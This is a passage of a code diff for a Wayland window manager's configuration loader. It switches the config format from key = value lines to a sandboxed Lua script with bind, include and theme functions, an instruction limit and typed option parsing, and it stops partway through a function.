@@ -5,15 +5,33 @@
 // This is the single source of truth for every tunable. Nothing else in
 // the code base may hard-code a gap, border, colour or command.
 //
-// File: $XDG_CONFIG_HOME/wmaker-wl/config.conf
-//       (falls back to ~/.config/wmaker-wl/config.conf)
+// File: $XDG_CONFIG_HOME/wmaker-wl/config.lua
+//       (falls back to ~/.config/wmaker-wl/config.lua)
 //
-// Format: `key = value`. `#` starts a comment when it is at the start of a
-// line or preceded by whitespace (so `border_focused = #d8a657` works).
+// Format: a plain Lua script (Lua 5.3 / 5.4, see lua.zig). Options are
+// global variables, key bindings and other files are function calls:
 //
-//     bind = Super+Shift+h, move_column_left
-//     bind = Super+Return, spawn alacritty --class foo
-//     unbind = Super+q
+//     gap = 10
+//     border_focused = "#d8a657"            -- or 0xd8a657
+//     terminal = "alacritty --class foo"    -- or { "alacritty", "--class", "foo" }
+//     bind("Super+Shift+h", "move_column_left")
+//     bind("Super+Return", "spawn alacritty --class foo")
+//     unbind("Super+q")
+//
+// The script runs on top of the built-in share/default_config.lua: whatever
+// it does not set keeps the default. Being a real script it can also loop,
+// compute and read the environment:
+//
+//     for i = 1, 9 do bind("Super+" .. i, "workspace " .. i) end
+//
+// Nothing in it can stop the session from starting: a Lua error, an unknown
+// option or a bad value is a warning in the log (and counted in
+// `parse_warnings`). A bad value is refused and the previous one stays; an
+// error in the script ends the script at that point, what ran before it
+// stays. Every global the script creates is an option: an unknown name
+// (`gapp = 8`) is reported, so typos do not go unnoticed. Helpers should be
+// `local`, or start with `_`, to stay out of that check. A script that runs
+// for far too long (endless loop) is aborted.
 //
 // Key names are resolved through xkbcommon, so they are layout-correct.
 // River matches bindings against the *active* layout; no manual QWERTZ /
@@ -23,16 +41,17 @@
 // a single character, by that character itself (`Super+ü`, `Super+ß`) --
 // handy on a German layout, where the key labelled ü has no ASCII name.
 //
-// `include = FILE` reads another file at that point (so later lines override
-// it); `theme = NAME` includes Themes/NAME.conf, restricted to the look
-// options (colours, border width, gaps) so a theme can never bind a key or
-// start a program. See `Includer`.
+// `include("FILE")` runs another file at that point, in the same script
+// (so later lines override it); `theme("NAME")` reads Themes/NAME.lua,
+// restricted to the look options (colours, border width, gaps) and run with
+// an EMPTY environment -- a theme sees no function at all, so it can never
+// bind a key, start a program or touch a file. See `themeInto`.
 //
 // By default a binding is translated with whichever layout is active at the
 // moment. `bind_layout = 0` (or 1, 2, 3) pins all bindings to that layout of
 // the keyboard instead, so a binding written as `Super+q` keeps working
 // after switching from `us` to `de` and back (river_xkb_binding_v1.
-// set_layout_override).
+// set_layout_override). `bind_layout = "current"` follows the active one.
 
 const std = @import("std");
 const wayland = @import("wayland");
@@ -167,9 +186,9 @@ pub const Config = struct {
     /// allows it. Neither needs to exist; a missing script is a no-op.
     enable_autostart: bool = true,
 
-    /// Lines the parser had to skip (unknown key, bad value, missing include,
-    /// a theme using an option themes may not use). The shipped files are
-    /// tested to have none.
+    /// Problems found while reading the config (Lua error, unknown option,
+    /// bad value, missing include, a theme using an option themes may not
+    /// use). The shipped files are tested to have none.
     parse_warnings: u32 = 0,
 
     // ---- keyboard -------------------------------------------------------------
@@ -201,8 +220,7 @@ pub const Config = struct {
     /// state file (see docs/DOCKAPPS.md) and read it back at start-up.
     dock_save_state: bool = true,
     /// Shrink the usable area by the Dock's width so tiled windows never end
-    /// up under it (whatever the Dock's level). A fullscreen window still
-    /// covers the whole output, the Dock then sits behind it.
+    /// up under it. Ignored while the Dock is lowered.
     dock_reserve_space: bool = true,
     /// Draw the Clip: one tile with workspace arrows plus the DockApps whose
     /// `place = clip` belongs to the current workspace.
@@ -236,7 +254,9 @@ pub const Config = struct {
     }
 };
 
-const default_config_text = @embedFile("share/default_config.conf");
+const lua = @import("lua.zig");
+
+const default_config_text = @embedFile("share/default_config.lua");
 
 /// Load configuration. Only fails on out-of-memory: a broken or missing
 /// user file falls back to the built-in defaults (with warnings), so the
@@ -272,16 +292,16 @@ pub fn load(io: std.Io, gpa: std.mem.Allocator) !Config {
 fn userConfigPath(a: std.mem.Allocator) !?[]const u8 {
     if (std.c.getenv("XDG_CONFIG_HOME")) |x| {
         const dir = std.mem.span(x);
-        if (dir.len > 0) return try std.fmt.allocPrint(a, "{s}/wmaker-wl/config.conf", .{dir});
+        if (dir.len > 0) return try std.fmt.allocPrint(a, "{s}/wmaker-wl/config.lua", .{dir});
     }
     if (std.c.getenv("HOME")) |h| {
-        return try std.fmt.allocPrint(a, "{s}/.config/wmaker-wl/config.conf", .{std.mem.span(h)});
+        return try std.fmt.allocPrint(a, "{s}/.config/wmaker-wl/config.lua", .{std.mem.span(h)});
     }
     return null;
 }
 
 // ----------------------------------------------------------------------------
-// Parsing
+// Running the script
 // ----------------------------------------------------------------------------
 
 /// Reads the files `include`/`theme` name. A callback so that parsing stays
@@ -298,6 +318,11 @@ pub const Includer = struct {
 };
 
 pub const max_include_depth = 4;
+
+/// VM instructions a script may execute before it is aborted. A real config
+/// needs a few thousand; this only exists so that an endless loop cannot
+/// hang the session (about a second of Lua).
+const max_script_instructions = 50_000_000;
 
 /// Where a theme is looked for besides next to the config.
 const theme_dirs = [_][]const u8{ "/usr/local/share/wmaker-wl/Themes", "/usr/share/wmaker-wl/Themes" };
@@ -328,6 +353,51 @@ pub fn validThemeName(name: []const u8) bool {
     return std.mem.indexOf(u8, name, "..") == null;
 }
 
+/// Everything one run of a config script needs. The Lua callbacks (bind,
+/// include, ...) are plain C functions without user data, so the run in
+/// progress is reached through `active`.
+const Ctx = struct {
+    L: *lua.State,
+    a: std.mem.Allocator,
+    cfg: *Config,
+    binds: *std.ArrayList(Bind),
+    /// Name used in messages about the whole script (not about one line).
+    origin: []const u8,
+    inc: ?*const Includer,
+    /// Directory of the file being run: relative includes and Themes/ start here.
+    dir: []const u8,
+    depth: u8,
+    /// An allocation failed inside a Lua callback (which cannot return an
+    /// error); parseWith reports it when the script is done.
+    oom: bool = false,
+
+    fn warn(ctx: *Ctx, comptime fmt: []const u8, args: anytype) void {
+        std.log.warn(fmt, args);
+        ctx.cfg.parse_warnings += 1;
+    }
+
+    /// A warning with the "file:line:" of the Lua code that made the call.
+    fn warnAt(ctx: *Ctx, comptime fmt: []const u8, args: anytype) void {
+        var buf: [512]u8 = undefined;
+        const msg = std.fmt.bufPrint(&buf, fmt, args) catch "(message too long)";
+        const loc = lua.where(ctx.L);
+        std.log.warn("{s}{s}", .{ loc, msg });
+        lua.pop(ctx.L, 1);
+        ctx.cfg.parse_warnings += 1;
+    }
+
+    fn print(ctx: *Ctx, comptime fmt: []const u8, args: anytype) ?[]u8 {
+        return std.fmt.allocPrint(ctx.a, fmt, args) catch {
+            ctx.oom = true;
+            return null;
+        };
+    }
+};
+
+threadlocal var active: ?*Ctx = null;
+
+const StringSet = std.StringHashMapUnmanaged(void);
+
 pub fn parse(
     a: std.mem.Allocator,
     text: []const u8,
@@ -338,8 +408,11 @@ pub fn parse(
     return parseWith(a, text, cfg, binds, origin, null, false);
 }
 
+/// Run the Lua script `text` and apply what it set to `cfg` / `binds`.
+///
 /// `inc` null: `include`/`theme` are refused (a warning). `theme_only`: the
-/// text comes from a theme, so only look options are accepted.
+/// text comes from a theme, so it runs with an empty environment and only
+/// look options are accepted.
 pub fn parseWith(
     a: std.mem.Allocator,
     text: []const u8,
@@ -349,76 +422,183 @@ pub fn parseWith(
     inc: ?*const Includer,
     theme_only: bool,
 ) std.mem.Allocator.Error!void {
-    var line_no: usize = 0;
-    var lines = std.mem.splitScalar(u8, text, '\n');
-    while (lines.next()) |raw| {
-        line_no += 1;
-        const line = stripComment(raw);
-        if (line.len == 0) continue;
+    const L = lua.newState() orelse return error.OutOfMemory;
+    defer lua.close(L);
+    lua.limitInstructions(L, max_script_instructions);
 
-        const eq = std.mem.indexOfScalar(u8, line, '=') orelse {
-            std.log.warn("{s}:{d}: expected `key = value`", .{ origin, line_no });
-            cfg.parse_warnings += 1;
-            continue;
-        };
-        const key = std.mem.trim(u8, line[0..eq], " \t");
-        const value = std.mem.trim(u8, line[eq + 1 ..], " \t\"");
+    var ctx: Ctx = .{
+        .L = L,
+        .a = a,
+        .cfg = cfg,
+        .binds = binds,
+        .origin = origin,
+        .inc = inc,
+        .dir = if (inc) |i| i.dir else ".",
+        .depth = if (inc) |i| i.depth else 0,
+    };
+    const outer = active;
+    active = &ctx;
+    defer active = outer;
 
-        const is_include = std.mem.eql(u8, key, "include");
-        const is_theme = std.mem.eql(u8, key, "theme");
-        if (is_include or is_theme) {
-            if (theme_only) {
-                std.log.warn("{s}:{d}: a theme cannot include anything", .{ origin, line_no });
-                cfg.parse_warnings += 1;
-            } else {
-                try includeFile(a, cfg, binds, inc, value, is_theme, origin, line_no);
-            }
-            continue;
-        }
-        if (theme_only and !themeKey(key)) {
-            std.log.warn("{s}:{d}: `{s}` is not a theme option (themes set colours, borders and gaps only)", .{ origin, line_no, key });
-            cfg.parse_warnings += 1;
-            continue;
-        }
+    // Names that exist before the script runs (the standard library and our
+    // functions): everything else the script creates is an option.
+    var baseline: StringSet = .empty;
 
-        applyOption(a, cfg, binds, key, value) catch |err| switch (err) {
-            error.OutOfMemory => return error.OutOfMemory,
-            error.UnknownKey => {
-                std.log.warn("{s}:{d}: unknown option `{s}`", .{ origin, line_no, key });
-                cfg.parse_warnings += 1;
-            },
-            error.Invalid => {
-                std.log.warn("{s}:{d}: bad value for `{s}`: {s}", .{ origin, line_no, key, value });
-                cfg.parse_warnings += 1;
-            },
-        };
+    if (theme_only) {
+        themeInto(&ctx, text, origin);
+    } else {
+        lua.openLibs(L);
+        lua.register(L, "bind", cBind);
+        lua.register(L, "unbind", cUnbind);
+        lua.register(L, "include", cInclude);
+        lua.register(L, "theme", cTheme);
+        try snapshotGlobals(&ctx, &baseline);
+        runChunk(&ctx, text, origin);
     }
+
+    try applyGlobals(&ctx, &baseline);
+    if (ctx.oom) return error.OutOfMemory;
 }
 
-fn includeFile(
-    a: std.mem.Allocator,
-    cfg: *Config,
-    binds: *std.ArrayList(Bind),
-    inc: ?*const Includer,
-    value: []const u8,
-    is_theme: bool,
-    origin: []const u8,
-    line_no: usize,
-) std.mem.Allocator.Error!void {
-    const what: []const u8 = if (is_theme) "theme" else "include";
-    const i = inc orelse {
-        std.log.warn("{s}:{d}: `{s}` is not available here", .{ origin, line_no, what });
-        cfg.parse_warnings += 1;
+/// Chunk name for messages: "@file" shows as "file:LINE:", "=<name>" as is.
+fn chunkName(ctx: *Ctx, origin: []const u8) ?[*:0]const u8 {
+    const prefix: u8 = if (origin.len > 0 and origin[0] == '<') '=' else '@';
+    const name = std.fmt.allocPrintSentinel(ctx.a, "{c}{s}", .{ prefix, origin }, 0) catch {
+        ctx.oom = true;
+        return null;
+    };
+    return name.ptr;
+}
+
+/// The error message on top of the Lua stack becomes a warning.
+fn luaFailed(ctx: *Ctx) void {
+    const msg = lua.toSlice(ctx.L, -1) orelse "(error object is not a string)";
+    ctx.warn("{s}", .{msg});
+    lua.pop(ctx.L, 1);
+}
+
+/// Run `text` in the script's own environment. The stack stays balanced.
+fn runChunk(ctx: *Ctx, text: []const u8, origin: []const u8) void {
+    const name = chunkName(ctx, origin) orelse return;
+    if (!lua.load(ctx.L, text, name)) return luaFailed(ctx);
+    if (!lua.call(ctx.L)) luaFailed(ctx);
+}
+
+/// Run a theme with an EMPTY environment (a fresh table: no `print`, no
+/// `os`, not even `bind`), then copy the look options it set into the
+/// script's globals, where later lines of the script override them and
+/// earlier ones are overridden. Anything else it set is a warning. A theme
+/// that fails halfway is dropped as a whole.
+fn themeInto(ctx: *Ctx, text: []const u8, origin: []const u8) void {
+    const L = ctx.L;
+    const name = chunkName(ctx, origin) orelse return;
+
+    lua.newTable(L); //                              [env]
+    if (!lua.load(L, text, name)) { //               [env, func] / [env, msg]
+        luaFailed(ctx);
+        lua.pop(L, 1);
+        return;
+    }
+    lua.pushValue(L, -2); //                         [env, func, env]
+    if (!lua.setEnv(L, -2)) { //                     [env, func]
+        lua.pop(L, 3);
+        return;
+    }
+    if (!lua.call(L)) { //                           [env] / [env, msg]
+        luaFailed(ctx);
+        lua.pop(L, 1);
+        return;
+    }
+
+    lua.pushNil(L);
+    while (lua.next(L, -2)) { //                     [env, key, value]
+        copyThemeEntry(ctx, origin);
+        lua.pop(L, 1);
+    }
+    lua.pop(L, 1); //                                []
+}
+
+/// Stack: [.., key, value]. Leaves it as it found it.
+fn copyThemeEntry(ctx: *Ctx, origin: []const u8) void {
+    const L = ctx.L;
+    const key = lua.toSlice(L, -2) orelse {
+        ctx.warn("{s}: a theme sets named options only", .{origin});
         return;
     };
-    if (i.depth >= max_include_depth) {
-        std.log.warn("{s}:{d}: `{s}` nested too deep (limit {d})", .{ origin, line_no, what, max_include_depth });
-        cfg.parse_warnings += 1;
+    if (!themeKey(key)) {
+        ctx.warn("{s}: `{s}` is not a theme option (themes set colours, borders and gaps only)", .{ origin, key });
+        return;
+    }
+    lua.pushGlobals(L); //       [key, value, G]
+    lua.pushValue(L, -3); //     [key, value, G, key]
+    lua.pushValue(L, -3); //     [key, value, G, key, value]
+    lua.rawSet(L, -3); //        G[key] = value        [key, value, G]
+    lua.pop(L, 1);
+}
+
+// ---- the functions a script can call ---------------------------------------
+//
+// They never raise a Lua error (that would longjmp across Zig frames): a
+// problem is a warning with the script's file and line, and the call is a
+// no-op.
+
+fn cBind(L: *lua.State) callconv(.c) c_int {
+    const ctx = active orelse return 0;
+    const combo = lua.toSlice(L, 1);
+    const command = lua.toSlice(L, 2);
+    if (combo == null or command == null) {
+        ctx.warnAt("bind() takes two strings: bind(\"Super+q\", \"close\")", .{});
+        return 0;
+    }
+    addBind(ctx.a, ctx.binds, combo.?, command.?) catch |err| switch (err) {
+        error.OutOfMemory => ctx.oom = true,
+        error.Invalid => ctx.warnAt("bad bind: `{s}`, `{s}`", .{ combo.?, command.? }),
+    };
+    return 0;
+}
+
+fn cUnbind(L: *lua.State) callconv(.c) c_int {
+    const ctx = active orelse return 0;
+    const combo = lua.toSlice(L, 1) orelse {
+        ctx.warnAt("unbind() takes one string: unbind(\"Super+q\")", .{});
+        return 0;
+    };
+    removeBind(ctx.binds, combo) catch ctx.warnAt("bad key combination for unbind: `{s}`", .{combo});
+    return 0;
+}
+
+fn cInclude(L: *lua.State) callconv(.c) c_int {
+    const ctx = active orelse return 0;
+    const value = lua.toSlice(L, 1) orelse {
+        ctx.warnAt("include() takes a file name: include(\"local.lua\")", .{});
+        return 0;
+    };
+    includeFile(ctx, value, false);
+    return 0;
+}
+
+fn cTheme(L: *lua.State) callconv(.c) c_int {
+    const ctx = active orelse return 0;
+    const value = lua.toSlice(L, 1) orelse {
+        ctx.warnAt("theme() takes a theme name: theme(\"nord\")", .{});
+        return 0;
+    };
+    includeFile(ctx, value, true);
+    return 0;
+}
+
+fn includeFile(ctx: *Ctx, value: []const u8, is_theme: bool) void {
+    const what: []const u8 = if (is_theme) "theme" else "include";
+    const i = ctx.inc orelse {
+        ctx.warnAt("`{s}` is not available here", .{what});
+        return;
+    };
+    if (ctx.depth >= max_include_depth) {
+        ctx.warnAt("`{s}` nested too deep (limit {d})", .{ what, max_include_depth });
         return;
     }
     if (value.len == 0) {
-        std.log.warn("{s}:{d}: `{s}` needs a value", .{ origin, line_no, what });
-        cfg.parse_warnings += 1;
+        ctx.warnAt("`{s}` needs a value", .{what});
         return;
     }
 
@@ -427,17 +607,16 @@ fn includeFile(
 
     if (is_theme) {
         if (!validThemeName(value)) {
-            std.log.warn("{s}:{d}: `{s}` is not a theme name", .{ origin, line_no, value });
-            cfg.parse_warnings += 1;
+            ctx.warnAt("`{s}` is not a theme name", .{value});
             return;
         }
-        const first = try std.fmt.allocPrint(a, "{s}/Themes/{s}.conf", .{ i.dir, value });
-        if (i.read(i.ctx, a, first)) |t| {
+        const first = ctx.print("{s}/Themes/{s}.lua", .{ ctx.dir, value }) orelse return;
+        if (i.read(i.ctx, ctx.a, first)) |t| {
             found_path = first;
             text = t;
         } else for (theme_dirs) |d| {
-            const p = try std.fmt.allocPrint(a, "{s}/{s}.conf", .{ d, value });
-            if (i.read(i.ctx, a, p)) |t| {
+            const p = ctx.print("{s}/{s}.lua", .{ d, value }) orelse return;
+            if (i.read(i.ctx, ctx.a, p)) |t| {
                 found_path = p;
                 text = t;
                 break;
@@ -446,101 +625,95 @@ fn includeFile(
     } else {
         const p = if (std.mem.startsWith(u8, value, "~/")) blk: {
             const home = std.c.getenv("HOME") orelse break :blk value;
-            break :blk try std.fmt.allocPrint(a, "{s}{s}", .{ std.mem.span(home), value[1..] });
+            break :blk ctx.print("{s}{s}", .{ std.mem.span(home), value[1..] }) orelse return;
         } else if (std.fs.path.isAbsolute(value))
             value
         else
-            try std.fmt.allocPrint(a, "{s}/{s}", .{ i.dir, value });
-        if (i.read(i.ctx, a, p)) |t| {
+            ctx.print("{s}/{s}", .{ ctx.dir, value }) orelse return;
+        if (i.read(i.ctx, ctx.a, p)) |t| {
             found_path = p;
             text = t;
         }
     }
 
     const path = found_path orelse {
-        std.log.warn("{s}:{d}: cannot read {s} `{s}`", .{ origin, line_no, what, value });
-        cfg.parse_warnings += 1;
+        ctx.warnAt("cannot read {s} `{s}`", .{ what, value });
         return;
     };
-    var child: Includer = .{
-        .ctx = i.ctx,
-        .read = i.read,
-        .dir = std.fs.path.dirname(path) orelse ".",
-        .depth = i.depth + 1,
-    };
-    try parseWith(a, text.?, cfg, binds, path, &child, is_theme);
-}
 
-/// Remove a trailing comment.
-///
-/// A `#` starts a comment when it is at the start of the line or follows
-/// whitespace, EXCEPT when it introduces a colour: `#` followed by exactly
-/// six hex digits and then whitespace/end (`border_focused = #d8a657`).
-fn stripComment(raw: []const u8) []const u8 {
-    var end = raw.len;
-    for (raw, 0..) |c, i| {
-        if (c != '#') continue;
-        if (!(i == 0 or raw[i - 1] == ' ' or raw[i - 1] == '\t')) continue;
-        if (isColour(raw[i..])) continue;
-        end = i;
-        break;
+    if (is_theme) {
+        themeInto(ctx, text.?, path);
+        return;
     }
-    return std.mem.trim(u8, raw[0..end], " \t\r");
+    // The included file runs in the same script (same globals); relative
+    // includes inside it start from its own directory.
+    const saved_dir = ctx.dir;
+    ctx.dir = std.fs.path.dirname(path) orelse ".";
+    ctx.depth += 1;
+    runChunk(ctx, text.?, path);
+    ctx.depth -= 1;
+    ctx.dir = saved_dir;
 }
 
-/// "#d8a657" (optionally followed by whitespace and more text).
-fn isColour(s: []const u8) bool {
-    if (s.len < 7 or s[0] != '#') return false;
-    for (s[1..7]) |ch| if (!std.ascii.isHex(ch)) return false;
-    return s.len == 7 or s[7] == ' ' or s[7] == '\t' or s[7] == '\r';
+// ---- from globals to Config -------------------------------------------------
+
+fn snapshotGlobals(ctx: *Ctx, set: *StringSet) std.mem.Allocator.Error!void {
+    const L = ctx.L;
+    lua.pushGlobals(L);
+    lua.pushNil(L);
+    while (lua.next(L, -2)) {
+        if (lua.toSlice(L, -2)) |k| try set.put(ctx.a, try ctx.a.dupe(u8, k), {});
+        lua.pop(L, 1);
+    }
+    lua.pop(L, 1);
+}
+
+/// Every global the script created is an option. Applied after the script
+/// ran, so the last assignment to a name is the one that counts.
+fn applyGlobals(ctx: *Ctx, baseline: *const StringSet) std.mem.Allocator.Error!void {
+    const L = ctx.L;
+    lua.pushGlobals(L);
+    lua.pushNil(L);
+    while (lua.next(L, -2)) { //  [G, key, value]
+        try applyEntry(ctx, baseline);
+        lua.pop(L, 1);
+    }
+    lua.pop(L, 1);
+}
+
+fn applyEntry(ctx: *Ctx, baseline: *const StringSet) std.mem.Allocator.Error!void {
+    const L = ctx.L;
+    const key = lua.toSlice(L, -2) orelse return;
+    if (key.len == 0 or key[0] == '_' or baseline.contains(key)) return;
+    applyOption(ctx, key) catch |err| switch (err) {
+        error.OutOfMemory => return error.OutOfMemory,
+        error.UnknownKey => ctx.warn("{s}: unknown option `{s}`", .{ ctx.origin, key }),
+        error.Invalid => ctx.warn("{s}: bad value for `{s}` (got a {s})", .{ ctx.origin, key, lua.typeName(L, -1) }),
+    };
 }
 
 const ParseError = error{ Invalid, UnknownKey, OutOfMemory };
 
-fn applyOption(
-    a: std.mem.Allocator,
-    cfg: *Config,
-    binds: *std.ArrayList(Bind),
-    key: []const u8,
-    value: []const u8,
-) ParseError!void {
+/// Set the option `key` to the Lua value on top of the stack. Nothing is
+/// changed unless the value is valid.
+fn applyOption(ctx: *Ctx, key: []const u8) ParseError!void {
+    const L = ctx.L;
+    const a = ctx.a;
+    const cfg = ctx.cfg;
     const eql = std.mem.eql;
-
-    // Options of the previous config format. Renamed ones keep working;
-    // dropped ones are explained once instead of failing as "unknown".
-    inline for (.{
-        .{ "default_column_width_fraction", "default_column_width" },
-        .{ "min_column_width", "min_window_size" },
-    }) |alias| {
-        if (eql(u8, key, alias[0])) return applyOption(a, cfg, binds, alias[1], value);
-    }
-    inline for (.{
-        .{ "keyboard_layout", "keys follow the active layout automatically" },
-        .{ "enable_mouse_support", "mouse bindings are always on; change `mouse_mod`" },
-        .{ "mouse_sensitivity", "pointer speed is a river/libinput setting" },
-        .{ "enable_floating_windows", "floating is always available (Super+t)" },
-    }) |old| {
-        if (eql(u8, key, old[0])) {
-            std.log.info("config: `{s}` is obsolete and ignored ({s})", .{ old[0], old[1] });
-            return;
-        }
-    }
-
-    if (eql(u8, key, "bind")) return addBind(a, binds, value);
-    if (eql(u8, key, "unbind")) return removeBind(binds, value);
 
     inline for (.{ "gap", "outer_gap", "border_width", "min_window_size", "drag_threshold", "dock_offset" }) |name| {
         if (eql(u8, key, name)) {
-            const v = std.fmt.parseInt(i32, value, 10) catch return error.Invalid;
+            const v = lua.toInteger(L, -1) orelse return error.Invalid;
             if (v < 0 or v > max_pixels) return error.Invalid;
-            @field(cfg, name) = v;
+            @field(cfg, name) = @intCast(v);
             return;
         }
     }
 
     inline for (.{ "default_column_width", "width_step", "floating_size" }) |name| {
         if (eql(u8, key, name)) {
-            const v = std.fmt.parseFloat(f64, value) catch return error.Invalid;
+            const v = lua.toNumber(L, -1) orelse return error.Invalid;
             if (!(v > 0 and v <= 1)) return error.Invalid;
             @field(cfg, name) = v;
             return;
@@ -549,9 +722,7 @@ fn applyOption(
 
     inline for (.{ "border_focused", "border_unfocused", "border_floating" }) |name| {
         if (eql(u8, key, name)) {
-            var v = std.mem.trimStart(u8, value, "#");
-            if (std.mem.startsWith(u8, v, "0x")) v = v[2..];
-            @field(cfg, name) = std.fmt.parseInt(u32, v, 16) catch return error.Invalid;
+            @field(cfg, name) = colourValue(L) orelse return error.Invalid;
             return;
         }
     }
@@ -571,80 +742,149 @@ fn applyOption(
         "focus_new_windows",
         "workspace_wrap",
         "clip_scroll_workspaces",
+        "focus_follows_mouse",
+        "enable_wmaker_compat",
+        "enable_autostart",
+        "enable_dockapps",
     }) |name| {
         if (eql(u8, key, name)) {
-            @field(cfg, name) = try parseBool(value);
+            @field(cfg, name) = lua.toBool(L, -1) orelse return error.Invalid;
+            return;
+        }
+    }
+
+    inline for (.{ "center_focused_column", "new_window", "dock_edge", "clip_corner", "menu_submenu_align" }) |name| {
+        if (eql(u8, key, name)) {
+            const s = lua.toSlice(L, -1) orelse return error.Invalid;
+            @field(cfg, name) = std.meta.stringToEnum(@TypeOf(@field(cfg, name)), s) orelse return error.Invalid;
+            return;
+        }
+    }
+
+    inline for (.{ "font_menu_title", "font_menu", "font_dock" }) |name| {
+        if (eql(u8, key, name)) {
+            const s = lua.toSlice(L, -1) orelse return error.Invalid;
+            @field(cfg, name) = try parseFont(a, s);
+            return;
+        }
+    }
+
+    inline for (.{ "terminal", "launcher", "browser" }) |name| {
+        if (eql(u8, key, name)) {
+            @field(cfg, name) = try commandValue(ctx);
             return;
         }
     }
 
     if (eql(u8, key, "workspace_count")) {
-        const v = std.fmt.parseInt(u32, value, 10) catch return error.Invalid;
+        const v = lua.toInteger(L, -1) orelse return error.Invalid;
         if (v < 1 or v > max_workspaces) return error.Invalid;
-        cfg.workspace_count = v;
-    } else if (eql(u8, key, "width_presets")) {
+        cfg.workspace_count = @intCast(v);
+        return;
+    }
+
+    if (eql(u8, key, "width_presets")) {
+        if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
+        const n = lua.rawLen(L, -1);
+        if (n == 0 or n > 64) return error.Invalid;
         var list: std.ArrayList(f64) = .empty;
-        var it = std.mem.tokenizeAny(u8, value, ", \t");
-        while (it.next()) |tok| {
-            const f = std.fmt.parseFloat(f64, tok) catch return error.Invalid;
-            if (!(f > 0 and f <= 1)) return error.Invalid;
-            try list.append(a, f);
+        var i: usize = 1;
+        while (i <= n) : (i += 1) {
+            lua.rawGetI(L, -1, @intCast(i));
+            const f = lua.toNumber(L, -1);
+            lua.pop(L, 1);
+            const v = f orelse return error.Invalid;
+            if (!(v > 0 and v <= 1)) return error.Invalid;
+            try list.append(a, v);
         }
-        if (list.items.len == 0) return error.Invalid;
         cfg.width_presets = try list.toOwnedSlice(a);
-    } else if (eql(u8, key, "center_focused_column")) {
-        cfg.center_focused_column = std.meta.stringToEnum(CenterMode, value) orelse return error.Invalid;
-    } else if (eql(u8, key, "new_window")) {
-        cfg.new_window = std.meta.stringToEnum(NewWindowMode, value) orelse return error.Invalid;
-    } else if (eql(u8, key, "focus_follows_mouse")) {
-        cfg.focus_follows_mouse = try parseBool(value);
-    } else if (eql(u8, key, "enable_wmaker_compat")) {
-        cfg.enable_wmaker_compat = try parseBool(value);
-    } else if (eql(u8, key, "enable_autostart")) {
-        cfg.enable_autostart = try parseBool(value);
-    } else if (eql(u8, key, "enable_dockapps")) {
-        cfg.enable_dockapps = try parseBool(value);
-    } else if (eql(u8, key, "bind_layout")) {
-        if (eql(u8, value, "current") or eql(u8, value, "active")) {
-            cfg.bind_layout = null;
-        } else {
-            const n = std.fmt.parseInt(u32, value, 10) catch return error.Invalid;
-            if (n >= max_bind_layouts) return error.Invalid;
-            cfg.bind_layout = n;
-        }
-    } else if (eql(u8, key, "dock_edge")) {
-        cfg.dock_edge = std.meta.stringToEnum(DockEdge, value) orelse return error.Invalid;
-    } else if (eql(u8, key, "clip_corner")) {
-        cfg.clip_corner = std.meta.stringToEnum(ClipCorner, value) orelse return error.Invalid;
-    } else if (eql(u8, key, "menu_submenu_align")) {
-        cfg.menu_submenu_align = std.meta.stringToEnum(SubmenuAlign, value) orelse return error.Invalid;
-    } else if (eql(u8, key, "workspace_names")) {
-        // Empty entries are kept (they mean "this workspace has no name"),
-        // so the names stay aligned with the workspace numbers.
+        return;
+    }
+
+    if (eql(u8, key, "workspace_names")) {
+        // Empty entries (and holes) are kept: they mean "this workspace has
+        // no name", so the names stay aligned with the workspace numbers.
+        if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
+        const n = lua.rawLen(L, -1);
+        if (n > 256) return error.Invalid;
         var list: std.ArrayList([]const u8) = .empty;
-        var it = std.mem.splitScalar(u8, value, ',');
-        while (it.next()) |tok| {
-            const name = std.mem.trim(u8, tok, " \t\"");
-            try list.append(a, try a.dupe(u8, name));
+        var i: usize = 1;
+        while (i <= n) : (i += 1) {
+            lua.rawGetI(L, -1, @intCast(i));
+            const is_nil = lua.typeOf(L, -1) == lua.T_NIL;
+            const s = lua.toSlice(L, -1);
+            if (!is_nil and s == null) {
+                lua.pop(L, 1);
+                return error.Invalid;
+            }
+            const copy = try a.dupe(u8, s orelse "");
+            lua.pop(L, 1);
+            try list.append(a, copy);
         }
         cfg.workspace_names = try list.toOwnedSlice(a);
-    } else if (eql(u8, key, "font_menu_title")) {
-        cfg.font_menu_title = try parseFont(a, value);
-    } else if (eql(u8, key, "font_menu")) {
-        cfg.font_menu = try parseFont(a, value);
-    } else if (eql(u8, key, "font_dock")) {
-        cfg.font_dock = try parseFont(a, value);
-    } else if (eql(u8, key, "mouse_mod")) {
-        cfg.mouse_mod = parseMods(value) orelse return error.Invalid;
-    } else if (eql(u8, key, "terminal")) {
-        cfg.terminal = parseCommand(a, value) catch |e| return mapCmdErr(e);
-    } else if (eql(u8, key, "launcher")) {
-        cfg.launcher = parseCommand(a, value) catch |e| return mapCmdErr(e);
-    } else if (eql(u8, key, "browser")) {
-        cfg.browser = parseCommand(a, value) catch |e| return mapCmdErr(e);
-    } else {
-        return error.UnknownKey;
+        return;
     }
+
+    if (eql(u8, key, "bind_layout")) {
+        if (lua.toInteger(L, -1)) |n| {
+            if (n < 0 or n >= max_bind_layouts) return error.Invalid;
+            const layout: u32 = @intCast(n);
+            cfg.bind_layout = layout;
+            return;
+        }
+        const s = lua.toSlice(L, -1) orelse return error.Invalid;
+        if (!(eql(u8, s, "current") or eql(u8, s, "active"))) return error.Invalid;
+        cfg.bind_layout = null;
+        return;
+    }
+
+    if (eql(u8, key, "mouse_mod")) {
+        const s = lua.toSlice(L, -1) orelse return error.Invalid;
+        cfg.mouse_mod = parseMods(s) orelse return error.Invalid;
+        return;
+    }
+
+    return error.UnknownKey;
+}
+
+/// A colour: `"#d8a657"`, `"d8a657"`, `"0xd8a657"` or the number `0xd8a657`.
+fn colourValue(L: *lua.State) ?u32 {
+    if (lua.toInteger(L, -1)) |n| {
+        if (n < 0 or n > 0xffff_ffff) return null;
+        const v: u32 = @intCast(n);
+        return v;
+    }
+    const s = lua.toSlice(L, -1) orelse return null;
+    var v = std.mem.trimStart(u8, s, "#");
+    if (std.mem.startsWith(u8, v, "0x")) v = v[2..];
+    return std.fmt.parseInt(u32, v, 16) catch null;
+}
+
+/// A command: a string, split like a command line ("foot -e \"htop -d 5\""),
+/// or a table that already is the argv ({ "foot", "-e", "htop -d 5" }).
+fn commandValue(ctx: *Ctx) ParseError![]const []const u8 {
+    const L = ctx.L;
+    const a = ctx.a;
